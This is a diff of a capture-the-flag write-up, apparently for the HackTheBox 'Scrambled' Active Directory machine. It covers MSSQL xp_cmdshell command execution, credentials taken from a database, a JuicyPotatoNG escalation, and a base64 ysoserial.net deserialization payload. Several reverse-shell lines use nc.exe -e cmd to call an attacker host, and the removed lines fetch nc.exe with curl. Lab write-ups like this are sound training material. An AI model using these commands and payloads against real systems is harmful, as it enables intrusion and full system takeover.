@@ -11,12 +11,6 @@ image: /assets/img/icons/Scrambled.png                # Add infocard image here 
 
 ### Host entries:
 ```bash
-127.0.0.1       localhost
-127.0.1.1       kali
-::1             localhost ip6-localhost ip6-loopback
-ff02::1         ip6-allnodes
-ff02::2         ip6-allrouters
-
 10.10.11.168    scrm.local dc1.scrm.local  
 ```
 If Active Directory => [NTP Synchronization](https://shuciran.github.io/posts/NTP-Synchronization/) with the domain controller.
@@ -387,7 +381,7 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 # numResponses: 1
 ```
 
-Trying to connect to database using domain controller: ^8adc8a
+Trying to connect to database using domain controller: [^mssql-connection]
 ```bash
 impacket-mssqlclient scrm.local/sa:sa@10.10.11.168
 ```
@@ -597,39 +591,196 @@ SQL> sp_configure "xp_cmdshell", 1
 SQL> reconfigure
 SQL> xp_cmdshell "whoami"
 ```
-Finally, we can get a reverse shell by executing the following commands:
+### User Privilege Escalation
+##### Unintended Way:
+
+We are user sqlsvc now we need to escalate to another user, it seems like miscsvc is a good option:
 ```bash
-# Upload the netcat windows binary:
-SQL> xp_cmdshell "mkdir C:\Windows\Temp\shuciran"
-SQL> xp_cmdshell "curl http://10.10.16.2/nc.exe -o C:\Windows\Temp\shuciran\nc.exe"
+Directory of C:\Users
+
+05/11/2021  14:56    <DIR>          .
+05/11/2021  14:56    <DIR>          ..
+05/11/2021  21:28    <DIR>          administrator
+03/11/2021  19:31    <DIR>          miscsvc
+26/01/2020  17:54    <DIR>          Public
+01/06/2022  13:58    <DIR>          sqlsvc
+```
+
+Since we have access to the SMB via kerberos authentication we can try to access via impacket-smbclient:
+```bash
+impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+# shares
+ADMIN$
+C$
+HR
+IPC$
+IT
+NETLOGON
+Public
+Sales
+SYSVOL
+```
+This gives us nothing other than some CLSIDs that we can try to enumerate with [SeImpersonatePrivilege](https://shuciran.github.io/posts/SeImpersonatePrivilege/) but this didn't work since no CLSID allows us to execute a program as SYSTEM.
+
+##### Intended Way
+
+Once inside the database we start to enumerate and we found this info: [^mssql-enum]
+```bash
+SQL> select name from master.sys.databases
+SQL> use ScrambleHR
+SQL> select * from information_schema.tables;
+SQL> select * from UserImport;
+LdapUser  LdapPwd  LdapDomain  RefreshInterval   IncludeGroups   --------  -------  ----------  ----------------  -------------   
+MiscSvc   ScrambledEggs9900   scrm.local 
+```
+
+We can enable xp_cmdshell feature to execute commands from MSSQL: [^mssql-command-execution]
+```bash
+SQL> xp_cmdshell"whoami"
+[-] ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+
+SQL> SP_CONFIGURE "show advanced options", 1
+[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL> RECONFIGURE
+
+SQL> SP_CONFIGURE "xp_cmdshell", 1
+[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL> RECONFIGURE
+
+SQL> xp_cmdshell"whoami"
+
 output                                                                             
 
-# Verify that is correctly uploaded
-SQL> xp_cmdshell "dir C:\Windows\Temp\shuciran\nc.exe"
-# Execute the reverse shell
-SQL> xp_cmdshell "C:\Windows\Temp\shuciran\nc.exe -e cmd.exe 10.10.16.2 443"
+scrm\sqlsvc                                                                        
 ```
-AND WE ARE INSIDE!!!
 
-### Root privesc
+To connect with this user as we are inside the machine we can use powershell to connect as a different user:
+```powershell
+$user = 'scrm.local\miscsvc'
 
+$password = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
 
+$cred = New-Object System.Management.Automation.PSCredential($user, $password)
 
+Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }
+```
 
-### Post Exploitation
+### Privilege Escalation
+
+[^seimpersonateprivilege]
+##### Unintended Way:
+
+In order to escalate directly as root we abuse of JuicyPotatoNG which is an excellent tool for Windows Server 2019:
+```bash
+JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Temp\nc.exe -e cmd 10.10.14.2 1234"
+```
+
+##### Intended Way
+
+Once that we are user miscsvc we start by enumerating the machine, we find the following two files:
+```powershell
+C:\Shares\IT\Apps\Sales Order Client>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5805-B4B6
+
+ Directory of C:\Shares\IT\Apps\Sales Order Client
+
+05/11/2021  20:57    <DIR>          .
+05/11/2021  20:57    <DIR>          ..
+05/11/2021  20:52            86,528 ScrambleClient.exe
+05/11/2021  20:52            19,456 ScrambleLib.dll
+               2 File(s)        105,984 bytes
+               2 Dir(s)  15,990,923,264 bytes free
+```
+
+This file is within the share and as we have now credentials for this user we can connect via SMB and extract such files:
+```cmd
+impacket-smbclient scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local -k
+# use IT
+# cd Apps\Sales Order Client
+# get ScrambleClient.exe
+# get ScrambleLib.dll
+```
+
+This files are written in .NET Assembly which is actually debuggable, means that we can get the source code with DNSpy:
+```bash
+file Scramble*
+ScrambleClient.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+ScrambleLib.dll:    PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
+```
+
+After debugging with a Windows Server 2012 and extract the source code we found the following deserialization vulnerable code: [^ysoserial-net]
+
+![Description](/assets/img/Pasted image 20230122220052.png)
+Now the important thing is to found the vulnerable input where it can be exploited, after running the ScrambleClient.exe we can identify a debug functionality which gives us a hint about what is being executed with this executable:
+![Description](/assets/img/Pasted image 20230122220636.png)
+
+Since this is .NET and there is a possible Deserialization vulnerability, we can generate the following payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net/releases/tag/v1.35)
+```cmd
+UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMUFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHlJREV5TXpRaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==
+```
+
+We can use this payload to send this data through the service opened on port 4411:
+```bash
+nc 10.10.11.168 4411              
+SCRAMBLECORP_ORDERS_V1.0.3;
+UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA8AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMUFVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUdOdFpDQXhNQzR4TUM0eE5DNHlJREV5TXpRaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==
+ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.
+```
+
+And we get NT AUTHORITY\\SYSTEM...
+```bash
+rlwrap nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.168] 64655
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+```
 
 ### Credentials
+
 ```bash
-sqlsvc:Pegasus60 NTLM -> B999A16500B87D17EC7F2E2A68778F05
+ksimpson@scrm.local:ksimpson
+sqlsvc:Pegasus60 -> SPN -> MSSQLSvc/dc1.scrm.local -> NTLM HASH: b999a16500b87d17ec7f2e2a68778f05 -> SID: S-1-5-21-2743207045-1827831105-254252320
+MiscSvc:ScrambledEggs9900
 ```
 
 ### Notes
 
-- Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
-- Always look for exploits, analyze them and check if something can be useful to exploit the machine.
-- Chisel has some
+- To exploit a Silver Ticket we need three things:
+	* DC SID
+	* SPN
+	* NTLM Hash
+* To create a deserialization attack it is a good idea to identify which one is the vulnerable input/code, it can be .NET, Java, etc. so in order to generate the payload we need to also understand the gadget and function that will be executed with ysoserial.
+* It is important to understand the impacket utilities in order to exploit an Active Directory on a better way, 
+	* Generate silver & golden tickets (impacket-ticketer)
+	* Connect to mssql database (impacket-mssqlclient)
+	* Extracting TGT tickets for an ASREPRoast attack (impacket-GetNPUsers)
+	* Extracting SPNs (impacket-GetUserSPNs)
+	* Extract DC SID (impacket-getPac)
+	* Start an SMB Server (impacket-smbserver)
+	* Connect to an SMB Server (impacket-smbclient)
+### References
 
-### Resources:
-
-[^ldap-enum]: LDAP Enumeration
-[^kerberoasting-attack]: Kerberoasting
+[SilverTicket Explanation Minuto 1:20:00](https://www.youtube.com/watch?v=osmFGqnFe8c&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29):
+![Description](/assets/img/Pasted image 20230122223446.png)
+[ysoserial.net](https://github.com/pwntester/ysoserial.net/releases/tag/v1.35)
+[GetUserSNPs.py issue](https://github.com/fortra/impacket/issues/1206)
+[NTLM Hash Generator](https://codebeautify.org/ntlm-hash-generator)
+[^seimpersonateprivilege]: SeImpersonatePrivilege JuicyPotatoNG for Windows Server 2019
+[^mssql-connection]: MSSQL Connection via impacket-mssqlclient
+[^mssql-enum]: MSSQL Enumeration
+[^mssql-command-execution]: MSSQL Command Executiion via xp_cmdshell
+[^ysoserial-net]: Ysoserial.net Deserialization attack
